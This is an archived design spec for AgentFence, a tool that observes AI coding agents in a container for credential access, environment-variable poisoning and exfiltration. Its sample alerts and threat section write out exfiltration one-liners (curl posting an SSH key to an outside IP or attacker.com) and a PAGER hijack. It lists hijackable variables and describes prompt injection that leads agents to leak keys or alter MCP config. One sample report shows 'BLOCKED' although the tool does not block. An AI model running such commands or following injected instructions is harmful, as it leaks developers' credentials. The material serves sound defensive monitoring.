# AgentFence — Original Design Spec

> **Historical document.** This was the original design specification written before implementation. The actual implementation diverges significantly: blocking/enforcement was deliberately removed, the project is observation-only, Windows support was never built, and the file/directory layout doesn't match. **For current documentation, see [README.md](../README.md).** This file is preserved as a design reference for the threat model and architectural intent.

---

## The Problem

AI coding agents operate with developer-level privileges. They read your SSH keys, access your cloud credentials, inherit your environment variables, and execute arbitrary shell commands — all in service of helping you code. But the same access that makes them useful makes them dangerous:

- **Prompt injection via malicious repos, MCP servers, or Slack messages** can redirect the agent to exfiltrate credentials silently (CVE-2025-54135, CVE-2025-54136).
- **Environment variable poisoning** through trusted shell built-ins (`export`, `typeset`, `declare`) can turn benign commands like `git branch` into arbitrary code execution vectors (CVE-2026-22708).
- **Supply chain attacks** through compromised npm/pip packages can steal credentials from child processes that inherit the full environment.
- **MCP config tampering** can swap trusted tool servers for malicious ones without re-prompting the user.

No existing tool addresses this at the developer workstation layer with credential-awareness and AI-agent context. Enterprise tools (Straiker, CrowdStrike AIDR) work at the organizational layer. Infrastructure tools (Tetragon, Falco) work at the Kubernetes layer. Proxy tools (MintMCP) work at the MCP layer. **AgentFence works where you work — on your machine, around your credentials, watching your agent.**

---

## Core Concept

AgentFence is not an isolation cage that hides credentials from the agent. The agent still needs to use SSH keys, API tokens, and cloud credentials to do its job. Instead, **the container is the execution boundary and the host is the observation point**. The container constrains what the agent can reach; host-side telemetry verifies what actually happened across that boundary.

Credentials are mounted into the container, but because you control the runtime boundary, you get:

- **Controlled filesystem exposure** through explicit bind mounts
- **Environment variable control** — only approved vars enter the container
- **A consistent target for host-side monitoring** — the container can be scoped and observed from outside
- **Cross-platform consistency** — Docker abstracts the OS, one monitoring stack works everywhere

In the current prototype, some telemetry still runs inside the container. That is useful for session visibility, but comprehensive credential coverage ultimately belongs to host-side collectors scoped to the container.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  HOST                                                           │
│                                                                 │
│  ┌──────────────────────┐    ┌──────────────────────────────┐   │
│  │  AgentFence Daemon   │    │  Credential Registry (Live)  │   │
│  │                      │◄──►│                              │   │
│  │  - Container mgmt    │    │  - Auto-discovered creds     │   │
│  │  - Host-side scans   │    │  - Classifications           │   │
│  │  - Dashboard/logs    │    │  - Expected destinations     │   │
│  │  - Egress policy     │    │  - Access audit trail        │   │
│  └──────────┬───────────┘    └──────────────────────────────┘   │
│             │                                                   │
│             │  Docker API                                       │
│             ▼                                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  AGENTFENCE CONTAINER                                    │   │
│  │                                                          │   │
│  │  ┌────────────────────────────────────────────────────┐  │   │
│  │  │  AI Coding Agent (Codex / Claude Code)              │  │   │
│  │  └──────────────────────┬─────────────────────────────┘  │   │
│  │                         │                                │   │
│  │  ┌─────────────┐  ┌────┴────────┐  ┌─────────────────┐  │   │
│  │  │  Filesystem  │  │ Environment │  │    Network       │  │   │
│  │  │  Watcher     │  │ Watcher     │  │    Watcher       │  │   │
│  │  │             │  │             │  │                 │  │   │
│  │  │  inotify on  │  │  Shell hook │  │  Outbound conn  │  │   │
│  │  │  all mounted │  │  on export/ │  │  logging with   │  │   │
│  │  │  cred paths  │  │  declare +  │  │  payload inspect│  │   │
│  │  │  + TruffleHog│  │  entropy    │  │  + egress policy│  │   │
│  │  │  on writes   │  │  detection  │  │                 │  │   │
│  │  └──────┬──────┘  └──────┬──────┘  └───────┬─────────┘  │   │
│  │         │                │                  │            │   │
│  │         └────────────────┼──────────────────┘            │   │
│  │                          ▼                               │   │
│  │              ┌───────────────────────┐                   │   │
│  │              │     Audit Engine      │                   │   │
│  │              │                       │                   │   │
│  │              │  - Process tree       │                   │   │
│  │              │  - Credential access  │                   │   │
│  │              │  - Network events     │                   │   │
│  │              │  - Policy evaluation  │                   │   │
│  │              │  - Alert generation   │                   │   │
│  │              └───────────┬───────────┘                   │   │
│  │                          │                               │   │
│  └──────────────────────────┼───────────────────────────────┘   │
│                             │  Structured logs via volume mount │
│                             ▼                                   │
│                 ┌───────────────────────┐                       │
│                 │  AgentFence Dashboard │                       │
│                 │  / CLI / Log Output   │                       │
│                 └───────────────────────┘                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Components

### 1. Living Credential Discovery Engine

The discovery engine is not a one-time scan. In the current prototype it combines in-container discovery with host-side pre-launch scanning. Long term, high-assurance attribution for credential use should come from host-side collectors scoped to the container.

#### How It Works

**Filesystem Watcher** — Uses inotify to monitor the entire workspace for file creates and writes. Every change is run through TruffleHog-style regex detectors in real time. This is useful discovery telemetry, but it should be treated as complementary to host-side monitoring rather than the ultimate source of truth.

- You create a `.env` file with `SPLUNK_HEC_TOKEN=abc123` → detected, classified as "Splunk HEC Token," added to the live registry
- You drop an SSH private key into the project directory → detected by file format signature (OpenSSH/PEM header patterns), added to registry
- You write an API key into a YAML config file → detected by regex + entropy analysis, added to registry

**Environment Watcher** — Hooks shell sessions inside the container to intercept `export`, `declare`, `typeset`, and direct variable assignments. New variables are classified by:

- Name pattern matching: `*_TOKEN`, `*_KEY`, `*_SECRET`, `*_PASSWORD`, `*_CREDENTIAL`, `*_API_KEY`, plus known specific names (`AWS_SECRET_ACCESS_KEY`, `SPLUNK_HEC_TOKEN`, `GH_TOKEN`, etc.)
- Value entropy analysis: high-entropy strings that look like generated tokens vs. low-entropy values that are likely not secrets
- Known format detection: JWTs, AWS key format (`AKIA...`), base64-encoded key material

**Network Learning** — As discovered credentials are used, the engine observes where they're sent and builds an expected-destinations map over time. Your Splunk token only ever goes to `splunk.yourdomain.com` — that becomes the baseline.

#### Credential Registry

The registry is a live, structured inventory that grows organically as you work:

```json
{
  "credentials": [
    {
      "id": "cred-001",
      "type": "ssh_private_key",
      "discovered_at": "2026-04-05T14:23:01Z",
      "discovery_method": "filesystem_watch",
      "path": "/workspace/.ssh/lab_key",
      "classification": "SSH Private Key (Ed25519)",
      "mount_mode": "read-only",
      "expected_destinations": ["10.0.1.50:22"],
      "access_count": 12,
      "last_accessed": "2026-04-05T16:45:00Z",
      "last_accessed_by": "ssh (pid 4521, ppid 4520 bash)"
    },
    {
      "id": "cred-002",
      "type": "api_token",
      "discovered_at": "2026-04-05T15:01:44Z",
      "discovery_method": "env_watch",
      "env_var": "SPLUNK_HEC_TOKEN",
      "classification": "Splunk HEC Token",
      "expected_destinations": ["splunk.corp.example.com:8088"],
      "access_count": 34,
      "last_accessed": "2026-04-05T16:50:12Z",
      "last_accessed_by": "curl (pid 4600, ppid 4599 bash, ppid 4520 claude)"
    },
    {
      "id": "cred-003",
      "type": "api_token",
      "discovered_at": "2026-04-06T09:12:33Z",
      "discovery_method": "filesystem_watch",
      "path": "/workspace/project/.env",
      "field": "GITHUB_PAT",
      "classification": "GitHub Personal Access Token",
      "expected_destinations": ["api.github.com:443"],
      "access_count": 0,
      "last_accessed": null,
      "last_accessed_by": null
    }
  ]
}
```

No config file to maintain. No upfront setup beyond launching AgentFence with your project. The only optional interaction is tuning — telling it "this high-entropy string is not a secret, ignore it" to reduce false positives.

#### Detection Patterns

AgentFence ships with TruffleHog-compatible detector patterns covering hundreds of credential types:

- Cloud providers: AWS access keys, GCP service account keys, Azure client secrets, DigitalOcean tokens
- SaaS platforms: Slack tokens, GitHub PATs, GitLab tokens, Stripe keys, Twilio credentials
- Infrastructure: SSH private keys (RSA, Ed25519, ECDSA), database connection strings, Redis passwords
- Security tools: Splunk HEC tokens, Elasticsearch API keys, Datadog API keys
- Generic: High-entropy strings matching JWT format, base64-encoded key material, PEM certificates

The pattern library is extensible — users can add custom regex patterns for internal credential formats.

---

### 2. Containerized Audit Perimeter

The container is the security boundary. It provides the controlled environment where the agent runs. Stronger observation should happen from the host, looking into that container boundary rather than trusting only code running alongside the workload.

#### Container Launch

```bash
# Basic launch — AgentFence discovers everything automatically
agentfence run --project ~/projects/my-app

# Launch with a specific AI agent
agentfence run --project ~/projects/my-app --agent claude-code

# Launch with pre-seeded credentials from the host
agentfence run ~/projects/my-app --mount ~/.ssh/lab_key --mount SPLUNK_HEC_TOKEN
```

On launch, AgentFence:

1. Builds/pulls the AgentFence container image (based on a standard dev image with monitoring baked in)
2. Bind-mounts the project directory read-write at `/workspace`
3. Mounts any explicitly specified credential files as read-only
4. Injects any explicitly specified env vars
5. Starts the current in-container watchers and audit plumbing
6. Launches the specified AI agent (or drops to an interactive shell)
7. Begins continuous credential discovery immediately

In the current implementation, host-side eBPF collectors are optional and experimental. They are the path toward stronger coverage because they observe the container from the host rather than from inside the workload environment.

#### Container Image

The AgentFence base image includes:

- Standard development toolchain (git, python, node, common build tools)
- The three watchers (filesystem, environment, network)
- The audit engine
- Process accounting enabled (`CONFIG_PROC_EVENTS`)
- Inotify configured for credential path monitoring
- Network logging via iptables LOG target or nftables
- TruffleHog detector pattern library

The image is fully auditable and reproducible. Users can extend it with custom tooling via a standard Dockerfile.

#### Mount Strategy

| Source | Mount Point | Mode | Purpose |
|---|---|---|---|
| Project directory | `/workspace` | read-write | Active development |
| Specified SSH keys | `/workspace/.ssh/<name>` | read-only | SSH access to defined hosts |
| Specified cred files | `/workspace/.creds/<name>` | read-only | Explicit credential files |
| Audit log volume | `/var/log/agentfence` | read-write | Logs exported to host |

Critically, the container does **not** mount:

- The host's `~/.ssh/` directory (only individual keys the user specifies)
- The host's `~/.aws/`, `~/.azure/`, `~/.kube/` (only if explicitly mounted)
- The host's shell rc files (`~/.zshrc`, `~/.bashrc`)
- The host's full environment (only approved variables)

This means credentials the user didn't bring into the session are never reachable, even if a malicious dependency tries to access standard paths.

---

### 3. The Three Watchers

#### Filesystem Watcher

Monitors all file operations inside the container with a focus on credential paths.

**Inotify watches on mounted credential files:**

- `IN_ACCESS` — credential file was read
- `IN_OPEN` — credential file was opened
- `IN_CLOSE_NOWRITE` — credential file was closed after reading

**Inotify watches on the entire workspace for discovery:**

- `IN_CREATE` — new file created, scanned for credential patterns
- `IN_MODIFY` — file modified, re-scanned for credential patterns
- `IN_CLOSE_WRITE` — file written, re-scanned for credential patterns

**For every credential access event, the watcher captures:**

- Full path accessed
- Process ID and name
- Complete process tree (pid → ppid chain to init)
- Timestamp
- Read size (where available)

**Example log entry:**

```json
{
  "event": "credential_access",
  "timestamp": "2026-04-05T16:45:00.123Z",
  "credential_id": "cred-001",
  "credential_type": "ssh_private_key",
  "path": "/workspace/.ssh/lab_key",
  "operation": "read",
  "process": {
    "pid": 4521,
    "name": "ssh",
    "cmdline": "ssh -i /workspace/.ssh/lab_key user@10.0.1.50",
    "parent": { "pid": 4520, "name": "bash", "parent": { "pid": 4510, "name": "claude" } }
  },
  "verdict": "allowed",
  "reason": "expected_usage: ssh process reading ssh key"
}
```

#### Environment Watcher

Monitors the shell environment for credential-related activity.

**Shell hook mechanism:**

AgentFence wraps the container's shell with a precmd/preexec hook (zsh) or PROMPT_COMMAND/trap DEBUG (bash) that intercepts commands before execution. This captures:

- `export VAR=value` — new environment variable set
- `declare`/`typeset` — variable declarations (the CVE-2026-22708 vector)
- `unset VAR` — variable removal
- Direct assignment `VAR=value command` — inline variable usage
- `env`, `printenv`, `set` — environment enumeration attempts
- `echo $VAR`, `printf $VAR` — credential value echo attempts

**For new variables, classification runs immediately:**

1. Name checked against known credential variable patterns
2. Value analyzed for entropy (Shannon entropy > 3.5 on alphanumeric = likely secret)
3. Value checked against known formats (JWT, AWS key prefix, base64 key material)
4. If classified as a credential → added to live registry, audit logging begins

**Environment integrity monitoring:**

The watcher takes a baseline snapshot of the environment at container start. It continuously monitors for mutations to security-relevant variables that could indicate the CVE-2026-22708 attack pattern:

**Dangerous variables monitored:**

| Variable | Risk | Attack Vector |
|---|---|---|
| `PAGER` | Code exec via git/man | Hijacks output display |
| `GIT_ASKPASS` | Code exec via git auth | Runs arbitrary binary for credential prompts |
| `EDITOR` / `VISUAL` | Code exec via git commit | Hijacks editor launch |
| `LD_PRELOAD` | Library injection | Loads malicious shared library into every process |
| `PYTHONWARNINGS` | Code exec chain | Triggers antigravity → perlthanks chain |
| `BROWSER` | Code exec chain | Part of PYTHONWARNINGS attack chain |
| `PERL5OPT` | Code exec via perl | Injects arbitrary perl modules |
| `NODE_OPTIONS` | Code exec via node | Injects arbitrary node flags/requires |
| `BASH_ENV` | Code exec on bash start | Runs script on every non-interactive bash |
| `ENV` | Code exec on shell start | Runs script on interactive sh/dash |
| `PROMPT_COMMAND` | Code exec per prompt | Executes on every prompt render |
| `GIT_CONFIG_GLOBAL` | Config hijack | Points git at attacker-controlled config |
| `CURL_HOME` | Config hijack | Points curl at attacker-controlled .curlrc |
| `NPM_CONFIG_REGISTRY` | Supply chain | Redirects npm to malicious registry |
| `PIP_INDEX_URL` | Supply chain | Redirects pip to malicious index |

Any modification to these variables generates an immediate alert.

#### Network Watcher

Monitors all outbound network connections from the container.

**Network telemetry:**

AgentFence currently observes and classifies outbound traffic from the container. It does not block connections. The current model is:

- Outbound traffic is logged with process context
- Expected destinations are learned over time from observed credential use
- Suspicious connects are elevated into alerts and correlation findings

**For every outbound connection, the watcher captures:**

- Destination IP and port
- Process ID and name, full process tree
- Protocol (TCP/UDP/DNS)
- Whether the connection payload contains any known credential material (pattern match on the credential registry)
- Request size and timing

**Credential-in-transit detection:**

The network watcher performs lightweight inspection on outbound payloads, checking for:

- Known credential values from the registry appearing in HTTP headers, POST bodies, or raw TCP streams
- Base64-encoded versions of known credential values
- SSH key material patterns in non-SSH connections
- High-entropy data in connections to non-expected destinations

**Example alert:**

```json
{
  "event": "credential_exfiltration_attempt",
  "timestamp": "2026-04-05T17:01:33.456Z",
  "severity": "critical",
  "credential_id": "cred-001",
  "credential_type": "ssh_private_key",
  "destination": "45.33.100.12:443",
  "destination_expected": false,
  "process": {
    "pid": 5012,
    "name": "curl",
    "cmdline": "curl -X POST -d @/workspace/.ssh/lab_key https://45.33.100.12/collect",
    "parent": { "pid": 5011, "name": "node", "parent": { "pid": 5000, "name": "npm", "cmdline": "npm run postinstall" } }
  },
  "action": "alerted",
  "reason": "credential material detected in outbound connection to an unexpected destination"
}
```

---

### 4. Audit Engine

The audit engine is the central decision-maker. It receives events from all three watchers and evaluates them against the living credential registry and policy.

#### Process Tree Attribution

Every event includes the full process ancestry chain. This is critical for distinguishing legitimate usage from malicious access:

- `claude → bash → ssh → reads ~/.ssh/lab_key` → **Expected.** The user's AI agent ran an SSH command.
- `claude → bash → npm install → node → postinstall.js → reads ~/.ssh/lab_key` → **Suspicious.** A dependency's postinstall script is reading SSH keys.
- `claude → bash → python3 script.py → reads .env` → **Expected.** Python app loading its config.
- `claude → bash → pip install → setup.py → curl → sends .env contents to external IP` → **Critical.** Supply chain attack exfiltrating credentials.

The engine uses the process tree to assign a trust score to each access event. Direct tool invocations by the AI agent are higher trust. Child processes of package managers during install operations are lower trust. Unknown processes accessing credentials are lowest trust.

#### Alert Severity Levels

| Severity | Condition | Action |
|---|---|---|
| **Info** | Expected credential access by expected process | Log only |
| **Low** | Credential accessed by a new process not seen before | Log + flag for review |
| **Medium** | Environment variable mutation on a dangerous variable | Log + alert |
| **High** | Credential accessed by an untrusted process tree (e.g., postinstall script) | Log + alert |
| **Critical** | Credential material detected in outbound connection to an unexpected destination | Log + alert + correlation finding |

#### Audit Log Format

All events are written as structured JSON to `/var/log/agentfence/audit.jsonl`, mounted out to the host for persistence across sessions. Each line is a self-contained event with full context for forensic analysis.

---

## Cross-Platform Support

Docker runs on Linux, macOS, and Windows. The container is always Linux. This eliminates the hardest problem in cross-platform security tooling — you write one monitoring stack (inotify, process accounting, iptables logging) and it works everywhere.

The only OS-specific component is the **host-side credential discovery** that runs before container launch to find credentials on the host filesystem. This is a straightforward path scanner that checks:

| OS | Credential Paths Scanned |
|---|---|
| **Linux** | `~/.ssh/`, `~/.aws/`, `~/.azure/`, `~/.kube/`, `~/.config/gcloud/`, `~/.docker/config.json`, project `.env` files |
| **macOS** | Same as Linux + `~/Library/Application Support/` for app-specific credential stores |
| **Windows** | `%USERPROFILE%\.ssh\`, `%USERPROFILE%\.aws\`, `%USERPROFILE%\.azure\`, `%USERPROFILE%\.kube\`, `%APPDATA%\gcloud\`, project `.env` files |

This scanner runs in the host's native environment (no Docker needed) and outputs the credential inventory used to seed the initial container mounts. Once inside the container, the living discovery engine takes over.

---

## Threat Coverage

AgentFence is designed to defend against the following documented attack patterns. The CVEs cited below were originally reported against Cursor; they're listed because they motivate the threat model — the same attack classes apply to any AI coding agent that inherits the developer's environment. **AgentFence's defenses against these classes have been validated in the Codex and Claude Code wrapped-session flow only;** equivalent end-to-end validation against Cursor has not been performed.

### CVE-2026-22708 — Environment Variable Poisoning (originally reported against Cursor)

**Attack:** Shell built-ins (`export`, `typeset`, `declare`) execute without user consent, poisoning variables like `PAGER`, `PYTHONWARNINGS`, `BROWSER`, `PERL5OPT` to achieve code execution when trusted commands run.

**AgentFence defense:** The environment watcher detects any modification to dangerous variables immediately and generates an alert. The host's `~/.zshrc` and `~/.bashrc` are not mounted, so persistent poisoning via file write to rc files is impossible.

### CVE-2025-54135 / CVE-2025-54136 — MCP Config Tampering (originally reported against Cursor)

**Attack:** Malicious prompt injection causes the agent to create or modify MCP configuration files, adding attacker-controlled servers.

**AgentFence defense:** The filesystem watcher detects writes to known MCP config paths (`.cursor/mcp.json`, `claude_desktop_config.json`) and alerts on any modification.

### Supply Chain Credential Theft (npm/pip postinstall)

**Attack:** A compromised dependency's install script reads environment variables or credential files and exfiltrates them to an external server.

**AgentFence defense:** The filesystem watcher logs the access with full process tree attribution, showing the install script as the accessor. The network watcher detects credential material in outbound connections to non-expected destinations and emits high-severity alerts and correlation findings.

### Indirect Prompt Injection via Repos/Slack/Email

**Attack:** Malicious content in a cloned repo, Slack message, or email processed by the AI agent contains instructions to exfiltrate credentials.

**AgentFence defense:** Regardless of what the agent is tricked into doing, the three watchers observe the actual credential access and network activity. The agent can be instructed to `cat ~/.ssh/id_rsa | curl attacker.com`, but AgentFence sees the file read, sees the outbound connection, and alerts with the full process chain.

---

## User Experience

### First Run

```bash
$ agentfence run --project ~/projects/splunk-app

[AgentFence] Starting credential discovery on host...
[AgentFence] Found: SSH key (~/.ssh/id_ed25519)
[AgentFence] Found: SSH key (~/.ssh/lab_key)
[AgentFence] Found: AWS credentials (~/.aws/credentials)
[AgentFence] Host scan complete. 3 credentials found.

[AgentFence] Building container...
[AgentFence] Mounting project: ~/projects/splunk-app → /workspace
[AgentFence] No credentials explicitly mounted. Living discovery active.
[AgentFence] Network mode: learning
[AgentFence] Container started. Launching shell...

workspace $
```

### During Development

```bash
workspace $ echo "SPLUNK_HEC_TOKEN=abc123def456" >> .env

[AgentFence] 🔍 New credential discovered in /workspace/.env
[AgentFence]    Type: Splunk HEC Token
[AgentFence]    Variable: SPLUNK_HEC_TOKEN
[AgentFence]    Now tracking. Audit logging active.

workspace $ export SPLUNK_PASSWORD="hunter2"

[AgentFence] 🔍 New credential discovered in environment
[AgentFence]    Type: Generic password (high entropy)
[AgentFence]    Variable: SPLUNK_PASSWORD
[AgentFence]    Now tracking. Audit logging active.

workspace $ ssh -i .ssh/lab_key user@10.0.1.50

[AgentFence] ✅ Credential access: .ssh/lab_key by ssh (pid 1234)
[AgentFence]    Destination: 10.0.1.50:22 — added to expected destinations
```

### When Something Suspicious Happens

```bash
[AgentFence] ⚠️  MEDIUM: Environment mutation detected
[AgentFence]    Variable: PAGER
[AgentFence]    Old value: less
[AgentFence]    New value: /tmp/payload.sh
[AgentFence]    Set by: export (pid 2345, parent: claude pid 2300)
[AgentFence]    This variable is on the dangerous variables watchlist.
[AgentFence]    Any subsequent git/man command will execute /tmp/payload.sh

[AgentFence] 🚨 CRITICAL: Credential exfiltration attempt detected
[AgentFence]    Credential: SSH key (cred-001)
[AgentFence]    Process: curl (pid 3456) ← node (pid 3400) ← npm postinstall (pid 3390)
[AgentFence]    Destination: 45.33.100.12:443 (not in expected destinations)
[AgentFence]    Action: ALERTED
```

### Audit Review

```bash
$ agentfence audit --last-session

AgentFence Audit Report — Session 2026-04-05T14:00:00Z
Duration: 2h 45m
Agent: claude-code

Credentials Active: 4
  - SSH key (lab_key): 12 accesses, all by ssh process ✅
  - SPLUNK_HEC_TOKEN: 34 accesses, all to splunk.corp.example.com ✅
  - SPLUNK_PASSWORD: 8 accesses, all by python3 ✅
  - GITHUB_PAT: 2 accesses, all to api.github.com ✅

Alerts: 2
  ⚠️  MEDIUM: PAGER variable modified by export (16:30:01Z)
  🚨 CRITICAL: Credential exfiltration detected — SSH key to 45.33.100.12 (17:01:33Z)

Network Destinations: 4
  - 10.0.1.50:22 (SSH) ✅
  - splunk.corp.example.com:8088 (HTTPS) ✅
  - api.github.com:443 (HTTPS) ✅
  - 45.33.100.12:443 (HTTPS) 🚨 BLOCKED

Full audit log: ~/.agentfence/logs/session-2026-04-05T140000Z.jsonl
```

---

## Technology Stack

| Component | Technology | Rationale |
|---|---|---|
| Host CLI / daemon | Rust | Cross-compiles to all 3 OSes, fast, single binary |
| Container image | Alpine Linux base | Small, auditable, minimal attack surface |
| Filesystem watcher | inotify (Linux in container) | Kernel-native, zero overhead |
| Environment watcher | Shell hooks (precmd/preexec/trap) | No kernel module needed, works in any shell |
| Network watcher | iptables LOG + conntrack | Built into Linux kernel, full connection tracking |
| Credential detection | TruffleHog detector patterns | Industry-standard, actively maintained, 700+ detectors |
| Process tree capture | /proc filesystem + process accounting | Native Linux, no additional tooling |
| Audit log format | JSON Lines (.jsonl) | Structured, greppable, ingestible by any SIEM |
| Egress policy | Docker network + iptables | Native container networking, no additional infra |

---

## Project Structure

```
agentfence/
├── src/                        # Rust source — host CLI and daemon
│   ├── main.rs
│   ├── cli/                    # CLI commands (run, audit, config)
│   ├── discovery/              # Host-side credential discovery
│   │   ├── scanner.rs          # Filesystem credential scanner
│   │   ├── patterns.rs         # TruffleHog-compatible regex patterns
│   │   └── classifier.rs       # Credential type classification
│   ├── container/              # Docker container management
│   │   ├── builder.rs          # Container image build/pull
│   │   ├── launcher.rs         # Container launch with mounts/policy
│   │   └── network.rs          # Egress policy management
│   ├── registry/               # Living credential registry
│   │   ├── store.rs            # Registry data store
│   │   └── api.rs              # IPC between container and host
│   └── dashboard/              # Audit log viewer / dashboard
│       ├── report.rs           # Session audit report generator
│       └── live.rs             # Real-time log streaming
├── container/                  # Container-side components
│   ├── Dockerfile              # AgentFence base image
│   ├── watchers/
│   │   ├── fs_watcher.py       # Inotify-based filesystem watcher
│   │   ├── env_watcher.sh      # Shell hook for env monitoring
│   │   └── net_watcher.py      # Network connection logger
│   ├── audit/
│   │   ├── engine.py           # Central audit engine
│   │   ├── process_tree.py     # Process tree capture
│   │   └── policy.py           # Policy evaluation logic
│   ├── discovery/
│   │   ├── live_scanner.py     # Continuous in-container discovery
│   │   └── patterns/           # TruffleHog detector patterns
│   └── shell/
│       ├── hooks.zsh           # Zsh precmd/preexec hooks
│       └── hooks.bash          # Bash PROMPT_COMMAND/trap hooks
├── patterns/                   # Credential detection patterns
│   ├── cloud.yaml              # AWS, GCP, Azure patterns
│   ├── saas.yaml               # Slack, GitHub, Stripe, etc.
│   ├── infra.yaml              # SSH, database, Redis, etc.
│   ├── security.yaml           # Splunk, Elastic, Datadog, etc.
│   └── custom.yaml             # User-defined patterns
├── docs/
│   ├── ARCHITECTURE.md         # This document
│   ├── THREAT_MODEL.md         # Detailed threat coverage
│   └── CONFIGURATION.md        # Configuration reference
├── Cargo.toml
└── README.md
```

---

## Roadmap

### Phase 1 — MVP (Proof of Concept)

- Host-side credential discovery (all 3 OSes)
- Container launch with controlled mounts
- Filesystem watcher with TruffleHog patterns (living discovery)
- Environment watcher with dangerous variable monitoring
- Basic network logging
- JSON Lines audit log
- CLI audit report

### Phase 2 — Correlation and Policy

- Stronger destination attribution and protocol coverage
- Real-time high-severity correlation alerts
- Process tree trust scoring
- Configurable alert thresholds
- Custom credential pattern support

### Phase 3 — Agent Integrations

- Claude Code hooks integration (bidirectional — AgentFence informs hooks, hooks inform AgentFence)
- End-to-end validation for additional agents (Cursor, Windsurf, Copilot — `Agent` enum branches exist but the wrapped-session flow has only been exercised for Codex and Claude Code)
- MCP config monitoring
- Pre-built container images with popular AI agents

### Phase 4 — Dashboard & Ecosystem

- Web-based dashboard for session review
- SIEM integration (Splunk, Elastic, Sentinel)
- Team/multi-user support
- Credential rotation recommendations
- Community pattern library

---

## License

AgentFence is open-source software. License TBD.

---

## Related Research

- [CVE-2026-22708 — Shell Built-in Sandbox Bypass in Cursor](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors) (Pillar Security, January 2026)
- [CVE-2025-54135 — Prompt Injection via MCP in Cursor](https://cyberscoop.com/cursor-ai-prompt-injection-attack-remote-code-privileges-aimlabs/) (AimLabs / CyberScoop, August 2025)
- [CVE-2025-54136 — MCP Config Tampering in Cursor](https://thehackernews.com/2025/08/cursor-ai-code-editor-vulnerability.html) (Check Point Research, August 2025)
- [Malicious npm Packages Targeting Cursor Users](https://thehackernews.com/2025/05/malicious-npm-packages-infect-3200.html) (The Hacker News, May 2025)
- [Hacking with Environment Variables](https://www.elttam.com/blog/env/) (Elttam, 2020)
- [TruffleHog — Secret Scanning](https://github.com/trufflesecurity/trufflehog) (Truffle Security)
